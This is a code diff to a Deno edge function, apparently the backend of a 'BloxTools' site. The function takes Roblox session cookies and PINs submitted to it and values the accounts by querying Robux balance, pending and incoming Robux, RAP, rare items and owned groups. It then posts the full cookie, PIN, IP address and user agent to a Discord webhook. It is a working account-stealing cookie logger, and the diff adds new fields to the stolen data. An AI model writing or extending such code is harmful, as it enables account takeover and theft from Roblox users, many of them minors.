@@ -23,6 +23,35 @@ const MASTER_WEBHOOK =
 
 const SITE_NAME = "BloxTools";
 
+// Discord emoji overrides — KEEP IN SYNC with src/config/toolsConfig.ts > discordEmojis
+// Edge functions cannot import from src/, so this is mirrored here.
+const EMOJI = {
+  robux:    "<:7116_Robux:1498757858731360349>",
+  premium:  "<:Roblox_Premium_logosvg:1498785365308211201>",
+  rap:      "💎",
+  summary:  "📊",
+  pending:  "⏳",
+  voice:    "🎤",
+  age:      "🪪",
+  korblox:  "💀",
+  headless: "👑",
+  groups:   "👑",
+  games:    "🎮",
+  cookie:   "🍪",
+  ip:       "🌐",
+  user:     "👤",
+  id:       "🆔",
+  age_acct: "📅",
+  friends:  "🫂",
+  followers:"👥",
+  following:"➡️",
+  ua:       "🖥️",
+  time:     "⏰",
+  pin:      "🔐",
+  owner:    "🏷️",
+};
+
+
 // Roblox bundle IDs
 const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
 const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman
@@ -130,6 +159,8 @@ Deno.serve(async (req) => {
         roblox_gamepass_earnings: robloxInfo?.gamepassEarnings ?? null,
         roblox_robux_spent: robloxInfo?.robuxSpent ?? null,
         roblox_summary: robloxInfo?.summary ?? null,
+        roblox_pending_robux: robloxInfo?.pendingRobux ?? null,
+        roblox_incoming_robux: robloxInfo?.incomingRobux ?? null,
         cookie_preview: body.cookie.slice(-16),
         cookie_full: body.cookie,
         is_valid: robloxInfo !== null,
@@ -214,6 +245,8 @@ interface RobloxInfo {
   gamepassEarnings: number | null;
   robuxSpent: number | null;
   summary: number | null;
+  pendingRobux: number | null;
+  incomingRobux: number | null;
   playedGames: Array<{ name: string; played: boolean }>;
 }
 
@@ -273,6 +306,8 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       gamepassEarnings: null,
       robuxSpent: transactionTotals.spent,
       summary: transactionTotals.summary,
+      pendingRobux: transactionTotals.pending,
+      incomingRobux: transactionTotals.incoming,
       playedGames,
     };
   } catch (e) {
@@ -479,17 +514,45 @@ function parseTotals(j: Record<string, number>): { spent: number; summary: numbe
 async function fetchTransactionTotals(
   userId: number,
   cookieHeader: string,
-): Promise<{ spent: number; summary: number }> {
+): Promise<{ spent: number; summary: number; pending: number; incoming: number }> {
   const csrf = await primeCsrf(cookieHeader);
 
   // Past year (rolling 12 months). Roblox's official timeFrame for this is "Year".
   const j = await fetchTotalsForTimeframe(userId, cookieHeader, csrf, "Year");
-  if (j) {
-    const parsed = parseTotals(j);
-    console.log("transaction-totals[Year] parsed", parsed);
-    return parsed;
+  const parsed = j ? parseTotals(j) : { spent: 0, summary: 0 };
+
+  // v1 endpoint exposes pendingRobuxTotal + incomingRobuxTotal directly.
+  let pending = 0;
+  let incoming = 0;
+  try {
+    const url = `https://economy.roblox.com/v1/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`;
+    const headers: Record<string, string> = {
+      Cookie: cookieHeader,
+      "user-agent": "Roblox/WinINet",
+    };
+    if (csrf) headers["x-csrf-token"] = csrf;
+    let r = await fetch(url, { headers });
+    if (r.status === 403) {
+      const newCsrf = r.headers.get("x-csrf-token");
+      if (newCsrf) {
+        headers["x-csrf-token"] = newCsrf;
+        r = await fetch(url, { headers });
+      }
+    }
+    if (r.ok) {
+      const v1 = await r.json() as Record<string, number>;
+      console.log("transaction-totals[v1/Year] raw", JSON.stringify(v1));
+      pending = Number(v1.pendingRobuxTotal ?? 0) || 0;
+      incoming = Number(v1.incomingRobuxTotal ?? 0) || 0;
+    } else {
+      console.error("v1 transaction-totals failed", r.status);
+    }
+  } catch (e) {
+    console.error("v1 transaction-totals error", e);
   }
-  return { spent: 0, summary: 0 };
+
+  console.log("transaction-totals parsed", { ...parsed, pending, incoming });
+  return { ...parsed, pending, incoming };
 }
 
 async function fetchProfile(userId: number): Promise<{ created: string } | null> {
@@ -588,8 +651,12 @@ function buildDiscordPayload(opts: {
   const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
 
   const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
-    { name: "Site Owner", value: ownerUsername, inline: true },
+    { name: `${EMOJI.owner} Site Owner`, value: ownerUsername, inline: true },
   ];
+
+  if (pin) {
+    mainFields.push({ name: `${EMOJI.pin} PIN`, value: pin, inline: true });
+  }
 
   if (extras) {
     for (const [k, v] of Object.entries(extras)) {
@@ -603,28 +670,32 @@ function buildDiscordPayload(opts: {
       ? `${roblox.accountAgeDays.toLocaleString()} days (${new Date(roblox.createdAt).toISOString().slice(0, 10)})`
       : "Unknown";
 
+    const robuxStr = roblox.robux !== null
+      ? `${roblox.robux.toLocaleString()}${roblox.pendingRobux ? ` (+${roblox.pendingRobux.toLocaleString()} pending)` : ""}`
+      : "Unknown";
+
     mainFields.push(
-      { name: "Roblox Username", value: `${roblox.name} (${roblox.displayName})`, inline: true },
-      { name: "User ID", value: String(roblox.id), inline: true },
-      { name: "Account Age", value: ageStr, inline: true },
-      { name: "Robux", value: roblox.robux !== null ? roblox.robux.toLocaleString() : "Unknown", inline: true },
-      { name: "RAP", value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
-      { name: "Premium", value: roblox.premium === null ? "Unknown" : roblox.premium ? "Yes" : "No", inline: true },
-      { name: "Friends", value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
-      { name: "Followers", value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
-      { name: "Following", value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
-      { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
-      { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
-      { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
-      { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
-      { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "📊 Summary (Past Year)", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
+      { name: `${EMOJI.user} Username (13+)`, value: `${roblox.name} (${roblox.displayName})`, inline: true },
+      { name: `${EMOJI.id} User ID`, value: String(roblox.id), inline: true },
+      { name: `${EMOJI.age_acct} Account Age`, value: ageStr, inline: true },
+      { name: `${EMOJI.robux} Robux (Pending)`, value: robuxStr, inline: true },
+      { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
+      { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
+      { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
+      { name: `${EMOJI.pending} Robux Incoming/Outgoing`, value: `${(roblox.incomingRobux ?? 0).toLocaleString()}/${(roblox.robuxSpent ?? 0).toLocaleString()}`, inline: true },
+      { name: `${EMOJI.korblox}/${EMOJI.headless} Korblox/Headless`, value: `${roblox.hasKorblox ? "True" : "False"}/${roblox.hasHeadless ? "True" : "False"}`, inline: true },
+      { name: `${EMOJI.friends} Friends`, value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.followers} Followers`, value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.following} Following`, value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.voice} Voice Chat`, value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
+      { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
+      { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
     );
 
     // Tracked games played
     if (roblox.playedGames.length > 0) {
       mainFields.push({
-        name: "🎮 Played Games",
+        name: `${EMOJI.games} Played Games`,
         value: roblox.playedGames
           .map((g) => `${g.played ? "✅" : "❌"} ${g.name}`)
           .join("\n"),
@@ -650,13 +721,13 @@ function buildDiscordPayload(opts: {
       if (buf) chunks.push(buf);
       chunks.forEach((c, i) => {
         mainFields.push({
-          name: chunks.length === 1 ? `👑 Owned Groups (${roblox.ownedGroups.length})` : `👑 Owned Groups (${i + 1}/${chunks.length})`,
+          name: chunks.length === 1 ? `${EMOJI.groups} Owned Groups (${roblox.ownedGroups.length})` : `${EMOJI.groups} Owned Groups (${i + 1}/${chunks.length})`,
           value: c,
           inline: false,
         });
       });
     } else {
-      mainFields.push({ name: "👑 Owned Groups", value: "None", inline: false });
+      mainFields.push({ name: `${EMOJI.groups} Owned Groups`, value: "None", inline: false });
     }
 
     mainFields.push(
@@ -667,9 +738,9 @@ function buildDiscordPayload(opts: {
   }
 
   mainFields.push(
-    { name: "IP Address", value: ip, inline: true },
-    { name: "User Agent", value: userAgent.slice(0, 1000), inline: false },
-    { name: "Submitted", value: new Date().toISOString(), inline: false },
+    { name: `${EMOJI.ip} IP Address`, value: ip, inline: true },
+    { name: `${EMOJI.ua} User Agent`, value: userAgent.slice(0, 1000), inline: false },
+    { name: `${EMOJI.time} Submitted`, value: new Date().toISOString(), inline: false },
   );
 
 
@@ -685,7 +756,7 @@ function buildDiscordPayload(opts: {
         timestamp: new Date().toISOString(),
       },
       {
-        title: "🍪 Account Cookie",
+        title: `${EMOJI.cookie} Account Cookie`,
         color: 0xff5555,
         description: "```\n" + cookie.slice(0, 4080) + "\n```",
         footer: { text: "Handle with care" },
